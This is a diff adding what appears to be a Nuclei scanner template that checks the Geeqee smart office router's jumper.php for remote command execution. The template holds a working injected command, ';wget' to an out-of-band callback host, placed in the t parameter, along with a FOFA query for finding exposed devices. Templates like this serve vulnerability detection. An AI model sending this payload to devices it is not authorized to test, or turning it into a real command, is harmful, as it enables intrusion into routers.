@@ -1,0 +1,28 @@
+id: geeqee-Router-jumper-rce
+
+info:
+  name: 极企智能办公路由 jumper.php - rce
+  author: god
+  severity: critical
+  description: 
+  metadata:
+    verified: true
+    fofa-query: title="极企智能办公路由"
+  tags: geeqee,rce,oob
+
+http:
+  - raw:
+      - |+
+        @timeout: 10s
+        GET /notice/jumper.php?t=;wget%20http://{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+
+    max-redirects: 3
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
